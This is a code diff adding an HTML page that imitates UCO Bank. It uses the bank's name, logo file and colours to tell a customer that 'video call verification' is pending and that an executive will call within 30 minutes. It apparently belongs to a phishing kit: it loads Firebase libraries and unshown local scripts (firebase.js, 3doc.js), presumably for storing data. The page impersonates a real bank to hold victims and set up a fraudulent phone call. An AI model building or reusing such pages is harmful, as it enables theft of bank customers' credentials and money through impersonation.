@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>UCO Bank - Video Call Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    .header {
+      background-color: #f7cc01;
+      padding: 10px;
+      text-align: center;
+    }
+
+    .header img {
+      max-height: 50px;
+      width: auto;
+    }
+
+    .banner {
+      text-align: center;
+      background-color: #0033a0;
+      color: white;
+      padding: 12px 10px;
+      font-size: 18px;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 30px auto;
+      background-color: white;
+      padding: 25px 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #0033a0;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    h1 {
+      color: #003366;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #444;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 15px 10px;
+      background-color: #0033a0;
+      color: white;
+      font-size: 14px;
+    }
+
+    .footer a {
+      margin: 5px 8px;
+      color: white;
+      text-decoration: none;
+      font-size: 16px;
+      display: inline-block;
+    }
+
+    .footer-img {
+      width: 100%;
+      max-width: 600px;
+      height: auto;
+      display: block;
+      margin: 20px auto;
+    }
+
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 18px;
+      }
+      p {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <img src="p_uco.png" alt="UCO Bank Logo" />
+  </div>
+
+  <div class="banner">
+    Dear Customer, Your Video Call Verification is Pending
+  </div>
+
+  <div class="container">
+    <div class="loader"></div>
+    <h1>Verification in Process</h1>
+    <p>
+      Thank you for your patience.<br>
+      Your video call verification is currently pending.<br>
+      Our customer care executive will call you within <strong>30 minutes</strong> to complete the process.
+    </p>
+  </div>
+
+  <div class="footer">
+    Follow us on:
+    <a href="#">WhatsApp</a>
+    <a href="#">Facebook</a>
+    <a href="#">Twitter</a>
+    <a href="#">Instagram</a>
+    <a href="#">YouTube</a>
+    <a href="#">LinkedIn</a>
+  </div>
+
+  <img src="foot.jpeg" alt="Footer Image" class="footer-img" />
+
+  <!-- Firebase Scripts -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1/firebase.js"></script>
+
+  <script src="firebase.js"></script>
+  <script src="3doc.js"></script>
+
+</body>
+</html>
